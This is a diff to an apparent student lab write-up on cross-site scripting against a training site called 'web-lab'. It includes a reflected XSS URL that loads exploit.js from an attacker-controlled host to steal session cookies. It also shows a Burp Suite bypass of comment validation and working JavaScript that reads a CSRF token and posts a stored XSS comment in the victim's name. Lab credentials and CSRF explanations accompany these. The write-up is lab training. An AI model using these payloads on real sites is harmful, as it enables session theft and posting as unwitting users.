@@ -177,7 +177,7 @@ URL of the form http://10.30.0.90/webpage?q=malicous-code , which leads
 to the reflected XSS vulnerability being exploited as soon as the user clicks a link.
 
 * so on excuting this command: 
-    > http://web-lab/search.php?q=<script src="http://10.30.0.1:9000/exploit.js"></script>
+    > http://web-lab/search.php?q=<script src="http://10.30.0.1:9000/exploit.js"\></script\>
 - we can see that I got the PHPSESSID as shown in the screenshot: 
     - ![alt text](image-9.png)
 - notice that if we were not logged in, the cookie parameter will be empty.
@@ -193,3 +193,137 @@ to the reflected XSS vulnerability being exploited as soon as the user clicks a 
 
         // then we send the GET request to the attacker with the victim cookie. 
     ```
+
+
+### Task5: Posting Malicious JavaScript to the Comments using XSS Attacks
+* In the previous task, we have seen how a reflected XSS attack can be utilized to hijack a user’s
+session at the click of a malicious link. While this is a powerful attack already, it is far from all
+that this XSS vulnerability can lead to. Ideally, we want to attack not just one user, but several.
+Fortunately for us, this is possible by chaining together multiple XSS vulnerabilities. Furthermore,
+we don’t want to have to make use of the stolen credentials by hand. Our ideal goal is to run the
+exploit fully within the breached user’s web browser, leading to them posting a malicious comment
+in their name without any trace of our own IP
+
+* At the end of this task, one careless click of a
+logged-in user will be enough for us to infect every other visitor of the forum, executing the following
+evil piece of JavaScript code on their systems:
+ ``` js
+    <script>
+    alert("ALL YOUR SCRIPT ARE BELONG TO US.");
+    </script>
+ ```
+
+#### Determine if the XSS vulnerability exist
+* First of all we need to log in with Ada account
+* Then in the Comment field we should try to insert the command: 
+    > <script\> alert("ALL YOUR SCRIPT ARE BELONG TO US.");</script\>
+
+* we will find that there is a validation in the form
+    - ![alt text](image-10.png)
+
+* so we will need to understand what are the invalid charachters, so by trial and error we will find that they are the special characters: 
+    - ;
+    - <
+    - \>
+    - = ! *
+* now we need to find a way to bypass such validation
+* first idea is to use **Burpsuite** to intercept the request, and try to modify it. 
+    1. open **burpsuite**
+    2. set the target as our url
+    3. open the proxy and make intercept on
+    4. in the comment add any dummy input: 
+        - ![alt text](image-11.png)
+    5. modify the input from **any data** to our script
+    6. forward the payload
+    7. we can see that the payload worked
+        - ![alt text](image-12.png)
+#### Investigating how to post a comment in Ada's name
+* lets see what is the content of the request when we try to Post any comment: 
+    - ![alt text](image-13.png)
+* we can see that we have 2 important parameters which are: 
+    - comment
+    - token256 which is the CSRF token
+* also we have Cookie as explained in Task4 before which contains the **PHPSESSID**
+* now we can write a javascript payloadd that does the following in the victim browser: 
+    1. Get the CSRF token from the request
+    2. Post a comment using that CSRF token
+    3. and insert XSS payload as a persistent worm: 
+        > <script\>alert("ALL YOUR SCRIPT ARE BELONG TO US.");</script\>
+```js
+// Step 1: Get the comments page to extract CSRF token
+fetch("http://web-lab/comments.php")
+  .then(response => response.text())
+  .then(html => {
+    // Parse HTML response
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(html, "text/html");
+
+    // Extract the CSRF token from the hidden input
+    const token = doc.querySelector('input[name="token256"]').value;
+
+    // Step 2: Prepare malicious comment payload
+    const payload = encodeURIComponent('<script>alert("Exploit is working.");</script>');
+
+    // Step 3: Submit the comment
+    fetch("http://web-lab/comments.php", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      body: `comment=${payload}&token256=${token}`
+    });
+  });
+
+
+```
+
+- in order to deploy it, we need to save it as **task5_payload/exploit.js**
+- run a server on our attacker machine
+    > python3 -m http.server 9000 --bind 10.30.0.1
+- send any request, and replace the comment parameter with this payload: 
+
+    > (script src="http://10.30.0.1:9000/exploit.js"> </script)
+
+- add this link in ada URL (simulating that ada pressed the link)
+- we can see that the exploit worked:
+    - ![alt text](image-14.png)
+
+##### Now lets answer some theoritical questions: 
+1. Q1) what is CSRF Token? 
+    - it is a cross-site request forgery token, which is a token used to prevent attacker from tricking logged-in users into unintentinally sending a request to a vulnerable site acting as that user.
+2. What is defends against? 
+    - CSRF attacks
+3. how it is utilized and checked? 
+    - when a user visit a site, it sets a session cookie
+    - A protected form includes hidden input field
+    - the server generates a random token when serving the page
+    - When the user submits the form, the token is sent back in the request.
+
+    - The server verifies:
+
+        - The user has a valid session (via cookie)
+
+        - The CSRF token matches what was issued
+##### Why This Defends Against CSRF
+
+- If an external attacker site tries to submit a request:
+
+    - It cannot read the protected page (due to Same-Origin Policy).
+
+    - So it can’t know the correct token.
+
+- Even if it includes the session cookie (which the browser sends automatically), the token will be missing or invalid → the request fails.
+
+##### Why This Does Not Defend Against XSS
+
+- XSS runs inside the victim's browser
+
+- It can read the HTML, extract the token using JavaScript, and use it to make valid requests
+
+
+##### Verify that the task work on other users: 
+- log in with Chalies's credientials: 
+    - charles | analytical
+- now we can see that it works: 
+    - ![alt text](image-15.png)
+    - and you can see that charles was forced to leave a comment while he actually did not insert anything.
